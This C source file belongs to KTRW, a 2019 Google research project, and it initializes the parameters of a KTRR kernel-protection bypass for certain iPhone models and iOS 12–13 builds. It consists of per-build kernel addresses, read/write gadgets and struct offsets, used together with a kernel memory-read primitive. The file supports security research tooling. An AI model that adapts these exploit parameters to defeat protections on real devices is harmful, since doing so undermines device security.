//
// Project: KTRW
// Author:  Brandon Azad <bazad@google.com>
//
// Copyright 2019 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//

#define KTRR_BYPASS_PARAMETERS_EXTERN PARAMETER_SHARED
#include "ktrr_bypass_parameters.h"

#include <assert.h>

#include "kernel_memory.h"
#include "kernel_slide.h"
#include "log.h"
#include "platform_match.h"

// ---- Offset initialization ---------------------------------------------------------------------

static void
offsets__iphone10_1__16C101() {
	SIZE(cpu_data_entry)                   = 16;
	OFFSET(cpu_data_entry, cpu_data_vaddr) = 8;
	OFFSET(cpu_data, cpu_regmap_paddr)     = 61 * 8;
	OFFSET(cpu_data, ed_mmio)              = 57 * 8;
	OFFSET(cpu_data, utt_mmio)             = 60 * 8;
}

static void
offsets__iphone10_1__17B102() {
	SIZE(cpu_data_entry)                   = 16;
	OFFSET(cpu_data_entry, cpu_data_vaddr) = 8;
	OFFSET(cpu_data, cpu_regmap_paddr)     = 63 * 8;
	OFFSET(cpu_data, ed_mmio)              = 59 * 8;
	OFFSET(cpu_data, utt_mmio)             = 62 * 8;
}

static struct platform_initialization offsets[] = {
	{ "iPhone10,1",            "16C101-16G77", offsets__iphone10_1__16C101 },
	{ "iPhone10,6",            "16E227",       offsets__iphone10_1__16C101 },
	{ "iPhone10,1|iPhone10,4", "17B102-17C54", offsets__iphone10_1__17B102 },
};

// ---- KTRR parameter initialization -------------------------------------------------------------

#define SLIDE(address)		(address == 0 ? 0 : address + kernel_slide)

static void
parameters__iphone10_1__16C101() {
	gPhysBase                   = kernel_read64(SLIDE(0xFFFFFFF0070B96D8));
	gVirtBase                   = kernel_read64(SLIDE(0xFFFFFFF0070B96E0));
	rorgn_begin                 = kernel_read64(SLIDE(0xFFFFFFF0070B99B8));
	rorgn_end                   = kernel_read64(SLIDE(0xFFFFFFF0070B99C0));
	cpu_ttep                    = kernel_read64(SLIDE(0xFFFFFFF0070B9488));
	kernel_pmap                 = kernel_read64(SLIDE(0xFFFFFFF0070B9468));
	ADDRESS(pmap_find_phys)     = SLIDE(0xFFFFFFF0071F88AC);
	ADDRESS(ml_phys_read_data)  = SLIDE(0xFFFFFFF007203CAC);
	ADDRESS(ml_phys_write_data) = SLIDE(0xFFFFFFF007203F14);
	ADDRESS(ml_io_map)          = SLIDE(0xFFFFFFF0072095CC);
	ADDRESS(ldr_w0_x0__ret)     = SLIDE(0xFFFFFFF00711EE60);
	ADDRESS(str_w1_x0__ret)     = SLIDE(0xFFFFFFF0061DF26C);
	ADDRESS(CpuDataEntries)     = SLIDE(0xFFFFFFF007634000);
}

static void
parameters__iphone10_6__16E227() {
	gPhysBase                   = kernel_read64(SLIDE(0xFFFFFFF0070B96E8));
	gVirtBase                   = kernel_read64(SLIDE(0xFFFFFFF0070B96F0));
	rorgn_begin                 = kernel_read64(SLIDE(0xFFFFFFF0070B99C8));
	rorgn_end                   = kernel_read64(SLIDE(0xFFFFFFF0070B99D0));
	cpu_ttep                    = kernel_read64(SLIDE(0xFFFFFFF0070B9498));
	kernel_pmap                 = kernel_read64(SLIDE(0xFFFFFFF0070B9478));
	ADDRESS(pmap_find_phys)     = SLIDE(0xFFFFFFF0071F74A4);
	ADDRESS(ml_phys_read_data)  = SLIDE(0xFFFFFFF0072024F4);
	ADDRESS(ml_phys_write_data) = SLIDE(0xFFFFFFF007202754);
	ADDRESS(ml_io_map)          = SLIDE(0xFFFFFFF007207EE0);
	ADDRESS(ldr_w0_x0__ret)     = SLIDE(0xFFFFFFF00711EE6C);
	ADDRESS(str_w1_x0__ret)     = SLIDE(0xFFFFFFF0061C600C);
	ADDRESS(CpuDataEntries)     = SLIDE(0xFFFFFFF0076ACD38);
}

static void
parameters__iphone10_1__16G77() {
	gPhysBase                   = kernel_read64(SLIDE(0xFFFFFFF0070B96E8));
	gVirtBase                   = kernel_read64(SLIDE(0xFFFFFFF0070B96F0));
	rorgn_begin                 = kernel_read64(SLIDE(0xFFFFFFF0070B99C8));
	rorgn_end                   = kernel_read64(SLIDE(0xFFFFFFF0070B99D0));
	cpu_ttep                    = kernel_read64(SLIDE(0xFFFFFFF0070B9498));
	kernel_pmap                 = kernel_read64(SLIDE(0xFFFFFFF0070B9478));
	ADDRESS(pmap_find_phys)     = SLIDE(0xFFFFFFF0071F75D4);
	ADDRESS(ml_phys_read_data)  = SLIDE(0xFFFFFFF007202AC0);
	ADDRESS(ml_phys_write_data) = SLIDE(0xFFFFFFF007202D20);
	ADDRESS(ml_io_map)          = SLIDE(0xFFFFFFF0072084AC);
	ADDRESS(ldr_w0_x0__ret)     = SLIDE(0xFFFFFFF00711F1D4);
	ADDRESS(str_w1_x0__ret)     = SLIDE(0xFFFFFFF00711F280);
	ADDRESS(CpuDataEntries)     = SLIDE(0xFFFFFFF0076ACD48);
}

static void
parameters__iphone10_1__17B102() {
	gPhysBase                   = kernel_read64(SLIDE(0xFFFFFFF007906B68));
	gVirtBase                   = kernel_read64(SLIDE(0xFFFFFFF007906B70));
	rorgn_begin                 = kernel_read64(SLIDE(0xFFFFFFF007906E58));
	rorgn_end                   = kernel_read64(SLIDE(0xFFFFFFF007906E60));
	cpu_ttep                    = kernel_read64(SLIDE(0xFFFFFFF0079067C0));
	kernel_pmap                 = kernel_read64(SLIDE(0xFFFFFFF0079067A0));
	ADDRESS(pmap_find_phys)     = SLIDE(0xFFFFFFF007CC39CC);
	ADDRESS(ml_phys_read_data)  = SLIDE(0xFFFFFFF007CCFF0C);
	ADDRESS(ml_phys_write_data) = SLIDE(0xFFFFFFF007CD01B0);
	ADDRESS(ml_io_map)          = SLIDE(0xFFFFFFF007CD5864);
	ADDRESS(ldr_w0_x0__ret)     = SLIDE(0xFFFFFFF007BD2EFC);
	ADDRESS(str_w1_x0__ret)     = SLIDE(0xFFFFFFF007BD2F80);
	ADDRESS(CpuDataEntries)     = SLIDE(0xFFFFFFF0091CACB8);
}

static void
parameters__iphone10_1__17C54() {
	gPhysBase                   = kernel_read64(SLIDE(0xFFFFFFF00790AB68));
	gVirtBase                   = kernel_read64(SLIDE(0xFFFFFFF00790AB70));
	rorgn_begin                 = kernel_read64(SLIDE(0xFFFFFFF00790AE58));
	rorgn_end                   = kernel_read64(SLIDE(0xFFFFFFF00790AE60));
	cpu_ttep                    = kernel_read64(SLIDE(0xFFFFFFF00790A7C0));
	kernel_pmap                 = kernel_read64(SLIDE(0xFFFFFFF00790A7A0));
	ADDRESS(pmap_find_phys)     = SLIDE(0xFFFFFFF007CCBDAC);
	ADDRESS(ml_phys_read_data)  = SLIDE(0xFFFFFFF007CD83EC);
	ADDRESS(ml_phys_write_data) = SLIDE(0xFFFFFFF007CD8690);
	ADDRESS(ml_io_map)          = SLIDE(0xFFFFFFF007CDDD44);
	ADDRESS(ldr_w0_x0__ret)     = SLIDE(0xFFFFFFF007BDAF34);
	ADDRESS(str_w1_x0__ret)     = SLIDE(0xFFFFFFF007BDAFB8);
	ADDRESS(CpuDataEntries)     = SLIDE(0xFFFFFFF0091D2C98);
}

static struct platform_initialization parameters[] = {
	{ "iPhone10,1",            "16C101", parameters__iphone10_1__16C101 },
	{ "iPhone10,6",            "16E227", parameters__iphone10_6__16E227 },
	{ "iPhone10,1",            "16G77",  parameters__iphone10_1__16G77  },
	{ "iPhone10,1|iPhone10,4", "17B102", parameters__iphone10_1__17B102 },
	{ "iPhone10,1|iPhone10,4", "17C54",  parameters__iphone10_1__17C54  },
};

// ---- Public API --------------------------------------------------------------------------------

#define ARRAY_COUNT(x)	(sizeof(x) / sizeof((x)[0]))

bool
ktrr_bypass_parameters_init() {
	static bool initialized = false;
	if (initialized) {
		return true;
	}
	assert(kernel_slide != 0);
	size_t count = run_platform_initializations(offsets, ARRAY_COUNT(offsets));
	if (count < 1) {
		ERROR("No KTRR bypass %s for %s %s", "offests",
				platform.machine, platform.osversion);
		return false;
	}
	count = run_platform_initializations(parameters, ARRAY_COUNT(parameters));
	if (count < 1) {
		ERROR("No KTRR bypass %s for %s %s", "parameters",
				platform.machine, platform.osversion);
		return false;
	}
	initialized = true;
	return true;
}
